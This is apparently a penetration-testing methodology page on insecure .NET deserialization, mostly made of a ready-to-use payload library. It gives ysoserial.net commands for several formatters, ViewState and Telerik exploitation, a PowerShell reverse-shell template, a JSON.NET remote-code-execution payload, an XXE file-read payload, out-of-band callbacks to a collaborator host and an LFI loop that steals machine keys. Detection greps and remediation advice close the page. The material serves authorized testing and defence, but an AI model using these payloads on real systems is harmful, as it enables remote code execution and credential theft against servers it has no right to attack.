---
title: "Insecure Deserialization — .NET"
date: 2026-02-24
draft: false
---

# Insecure Deserialization — .NET

> **Severity**: Critical | **CWE**: CWE-502
> **OWASP**: A08:2021 – Software and Data Integrity Failures

---

## What Is .NET Deserialization?

.NET has multiple serialization formats and deserializers — each with different gadget chains. The most dangerous are `BinaryFormatter` and `SoapFormatter` (both removed/disabled in .NET 5+), but many legacy applications still use them. JSON.NET (`Newtonsoft.Json`) is vulnerable to **type confusion** when `TypeNameHandling` is set insecurely.

```
BinaryFormatter:  binary format — .NETSEC magic bytes: 00 01 00 00 00
SoapFormatter:    XML/SOAP format — <SOAP-ENV:Envelope>
LosFormatter:     ViewState format — /w...
ObjectStateFormatter: ASP.NET ViewState (HMAC-signed but weak key)
JSON.NET:         {"$type":"System.Windows.Data.ObjectDataProvider,..."}
DataContractSerializer: XML with type hints
```

**ysoserial.net** is the primary tool — equivalent of ysoserial for Java.

---

## Discovery Checklist

**Phase 1 — Identify Serialization**
- [ ] Check cookies for base64/binary blobs (ASP.NET ViewState, session cookies)
- [ ] Check POST bodies for XML/SOAP with type annotations
- [ ] Look for `BinaryFormatter`, `SoapFormatter`, `NetDataContractSerializer` in Telerik, ASP.NET, SharePoint
- [ ] Check `__VIEWSTATE` parameter — if no HMAC key or weak key → exploit
- [ ] Check JSON with `$type` property → JSON.NET TypeNameHandling
- [ ] Check WCF endpoints (`.svc`) for SOAP deserialization
- [ ] Find Telerik UI RadAsyncUpload endpoint: `/Telerik.Web.UI.WebResource.axd`
- [ ] Check `.asmx` (legacy web services) for SOAP deserialization

**Phase 2 — Fingerprint Format**
- [ ] `00 01 00 00 00 ff ff ff ff` → BinaryFormatter (`AAEAAAD/////...` in base64)
- [ ] `AAEAAAD` at base64 start → .NET BinaryFormatter
- [ ] `<SOAP-ENV:` or `<soap:` → SoapFormatter/NetDataContractSerializer
- [ ] `/wEy` at base64 start → LosFormatter (older) or ObjectStateFormatter
- [ ] `{"$type":` → JSON.NET with TypeNameHandling

**Phase 3 — Exploit**
- [ ] Generate payload with ysoserial.net for appropriate gadget chain
- [ ] Test OOB DNS first — confirm deserialization without RCE trigger
- [ ] Match gadget chain to libraries present in target
- [ ] For ViewState: extract MAC key if possible, or test with empty key / disabled MAC

---

## Payload Library

### Payload 1 — ysoserial.net Usage

```bash
# Install / build ysoserial.net:
git clone https://github.com/pwntester/ysoserial.net
# Build with Visual Studio or dotnet CLI
cd ysoserial.net
dotnet build

# List all available gadgets and formatters:
ysoserial.exe -l

# List plugins:
ysoserial.exe -p list

# Basic RCE payload — BinaryFormatter with TextFormattingRunProperties gadget:
ysoserial.exe -f BinaryFormatter \
  -g TextFormattingRunProperties \
  -c "cmd /c calc.exe" \
  -o base64

# Reverse shell:
ysoserial.exe -f BinaryFormatter \
  -g TextFormattingRunProperties \
  -c "cmd /c powershell -nop -w hidden -e BASE64_ENCODED_PS" \
  -o base64

# Commonly used gadget chains per .NET version:
# .NET 3.5: ObjectDataProvider, ToolboxItemContainer
# .NET 4.0+: TextFormattingRunProperties, WindowsIdentity
# .NET 4.5+: TypeConfuseDelegate, ActivitySurrogateSelectorFromFile
# ActivitySurrogateSelector — most reliable, works without specific DLLs

# SoapFormatter payload:
ysoserial.exe -f SoapFormatter \
  -g ActivitySurrogateSelector \
  -c "cmd /c ping COLLABORATOR_ID.oast.pro" \
  -o base64

# NetDataContractSerializer:
ysoserial.exe -f NetDataContractSerializer \
  -g WindowsIdentity \
  -c "cmd /c nslookup COLLABORATOR_ID.oast.pro" \
  -o base64

# LosFormatter (often used in old ASP.NET pages):
ysoserial.exe -f LosFormatter \
  -g TextFormattingRunProperties \
  -c "cmd /c whoami > C:\\inetpub\\wwwroot\\pwned.txt" \
  -o base64
```

### Payload 2 — ViewState Exploitation

```bash
# ASP.NET ViewState = base64-encoded serialized page state
# In forms: <input type="hidden" name="__VIEWSTATE" value="...">
# If MAC validation disabled OR MAC key is known/weak → exploit

# Check if ViewState MAC is disabled:
# Response with __VIEWSTATE but no __VIEWSTATEGENERATOR validation
# OR: web.config contains enableViewStateMac="false"

# Generate malicious ViewState with ysoserial.net:
# LosFormatter plugin for ViewState:
ysoserial.exe -p ViewState \
  -g TextFormattingRunProperties \
  -c "cmd /c ping COLLABORATOR_ID.oast.pro" \
  --path "/default.aspx" \
  --apppath "/" \
  --decryptionalg "AES" \
  --decryptionkey "DECRYPTION_KEY_FROM_WEB_CONFIG" \
  --validationalg "SHA1" \
  --validationkey "VALIDATION_KEY_FROM_WEB_CONFIG"

# Plug: inject into __VIEWSTATE parameter
# The payload must match the page's generator ID + app path

# Find machine keys (common paths when you have RFI/LFI/path traversal):
# C:\inetpub\wwwroot\web.config
# C:\Windows\Microsoft.NET\Framework\v4.0.30319\CONFIG\web.config
# %WINDIR%\Microsoft.NET\Framework64\v4.0.30319\CONFIG\machine.config

# Machine key format in web.config:
# <machineKey validationKey="..." decryptionKey="..." validation="SHA1" decryption="AES"/>

# Blacklist-bypass payload for ViewState with known key:
ysoserial.exe -p ViewState \
  -g ActivitySurrogateSelector \
  -c "cmd /c whoami" \
  --path "/default.aspx" \
  --apppath "/" \
  --decryptionalg "AES" \
  --decryptionkey "YOUR_KEY" \
  --validationalg "HMACSHA256" \
  --validationkey "YOUR_VALIDATION_KEY" \
  --islegacy
```

### Payload 3 — JSON.NET Type Confusion

```bash
# When Newtonsoft.Json uses TypeNameHandling.All or TypeNameHandling.Objects:
# User-supplied JSON can specify any .NET type via "$type" property

# Detection — check if $type is processed:
# Send: {"$type":"System.String, mscorlib","m_value":"test"}
# → If no error (not "unexpected token") → TypeNameHandling active

# RCE payload via ObjectDataProvider:
{
  "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
  "MethodName": "Start",
  "MethodParameters": {
    "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
    "$values": ["cmd", "/c ping COLLABORATOR_ID.oast.pro"]
  },
  "ObjectInstance": {
    "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
  }
}

# Generate via ysoserial.net:
ysoserial.exe -f Json.Net \
  -g ObjectDataProvider \
  -c "cmd /c ping COLLABORATOR_ID.oast.pro" \
  -o raw

# File read (SSRF-like via XMLDocument):
{
  "$type": "System.Xml.XmlDocument, System.Xml",
  "InnerXml": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///C:/Windows/win.ini'>]><foo>&xxe;</foo>"
}

# Alternative via WindowsIdentity (no PresentationFramework needed):
ysoserial.exe -f Json.Net \
  -g WindowsIdentity \
  -c "cmd /c whoami" \
  -o base64
```

### Payload 4 — Telerik RadAsyncUpload

```bash
# Telerik UI for ASP.NET WebForms — vulnerable endpoint:
# /Telerik.Web.UI.WebResource.axd?type=rau

# Payload requires knowing or brute-forcing the Telerik encryption key
# (stored in web.config as Telerik.Upload.ConfigurationHashKey or
#  Telerik.Web.UI.DialogParametersEncryptionKey)

# ysoserial.net Telerik plugin:
ysoserial.exe -p Telerik \
  -g ObjectDataProvider \
  -c "cmd /c whoami > C:\\inetpub\\wwwroot\\pwned.txt" \
  --key "YOUR_TELERIK_KEY" \
  --version "2019.3.1023" \
  -o base64

# Send to upload endpoint:
curl -s -X POST "https://target.com/Telerik.Web.UI.WebResource.axd?type=rau" \
  -F "rauPostData=BASE64_PAYLOAD" \
  -F "file=@/dev/null;type=image/jpeg"

# Check for Telerik version:
curl -s "https://target.com/Telerik.Web.UI.WebResource.axd?type=rau&access=w"
# Response reveals Telerik version → match with ysoserial.net version param
```

### Payload 5 — WCF / SOAP Deserialization

```bash
# WCF endpoints (.svc) using NetDataContractSerializer or BinaryMessageEncoder:

# Generate SOAP payload:
ysoserial.exe -f NetDataContractSerializer \
  -g WindowsIdentity \
  -c "cmd /c ping COLLABORATOR_ID.oast.pro" \
  -o raw

# Wrap in SOAP envelope:
curl -s -X POST "https://target.com/service.svc" \
  -H "Content-Type: text/xml; charset=utf-8" \
  -H "SOAPAction: \"\"" \
  -d '<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">
    <s:Body>
      <![CDATA[YSOSERIAL_PAYLOAD_HERE]]>
    </s:Body>
  </s:Envelope>'

# DataContractSerializer type confusion (requires known contract):
curl -s -X POST "https://target.com/api/deserialize" \
  -H "Content-Type: application/xml" \
  -d '<root xmlns:i="http://www.w3.org/2001/XMLSchema-instance"
        i:type="a:WorkflowDesigner_ActivitySurrogateSelector"
        xmlns:a="ysoserial">'
```

---

## Tools

```bash
# ysoserial.net — primary .NET deserialization exploit tool:
git clone https://github.com/pwntester/ysoserial.net
# Build: Visual Studio or:
dotnet build ysoserial.net -c Release

# List all formatters:
ysoserial.exe -l

# Specific formatter + gadget combos (most reliable):
# BinaryFormatter + TextFormattingRunProperties (needs PresentationCore.dll in scope)
# BinaryFormatter + ActivitySurrogateSelector (most universal)
# Json.Net + ObjectDataProvider
# ViewState plugin with known machineKey

# ExploitRemotingService — .NET remoting deserialization:
git clone https://github.com/tyranid/ExploitRemotingService

# Detect .NET deserialization in traffic:
# BinaryFormatter magic bytes: AAEAAAD/ (base64) or 00 01 00 00 00 FF FF FF FF (hex)
# LosFormatter: /wEy (base64 start)

python3 -c "
import base64
data = 'AAEAAAD/////AQAAAAAAAABMAQAAAAc='  # BinaryFormatter example
decoded = base64.b64decode(data + '==')
print(decoded[:10].hex())
# 0001000000ffffffff01000000 → BinaryFormatter magic
"

# Find web.config machine keys (with LFI):
for path in \
  'C:/inetpub/wwwroot/web.config' \
  'C:/Windows/Microsoft.NET/Framework/v4.0.30319/CONFIG/web.config' \
  'C:/Windows/Microsoft.NET/Framework64/v4.0.30319/CONFIG/machine.config'; do
  curl -s "https://target.com/?file=../../../../$path" 2>/dev/null | \
    grep -i "machineKey\|validationKey\|decryptionKey"
done

# Burp Scanner:
# "Insecure deserialization" issue type covers .NET patterns
# Search responses for AAEAAAD or /wEy patterns

# Source code patterns to grep:
grep -rn "BinaryFormatter\|SoapFormatter\|LosFormatter\|NetDataContractSerializer\|XmlSerializer\|DataContractSerializer" \
  --include="*.cs" --include="*.vb" src/ | \
  grep -v "//.*Formatter"    # exclude commented lines
grep -rn "TypeNameHandling\." --include="*.cs" src/ | \
  grep -v "None"             # TypeNameHandling.None is safe
```

---

## Remediation Reference

- **Disable `BinaryFormatter`**: set `AppContext.SetSwitch("System.Runtime.Serialization.EnableUnsafeBinaryFormatterSerialization", false)` or upgrade to .NET 5+ where it's disabled by default
- **JSON.NET**: set `TypeNameHandling = TypeNameHandling.None` — never use `All`, `Objects`, or `Auto` with untrusted data
- **ViewState**: always enforce MAC validation (`enableViewStateMac="true"`); use strong random machine keys; consider encrypting ViewState
- **DataContractSerializer with KnownTypes**: restrict deserializable types to an explicit allowlist
- **WCF**: disable NetDataContractSerializer; use DataContractSerializer with strict type registration
- **Telerik**: upgrade to patched version; change the encryption key to a random 64+ char value
- **Serialize only what you need**: prefer JSON/XML with explicit type mapping over binary/polymorphic serializers

*Part of the Web Application Penetration Testing Methodology series.*
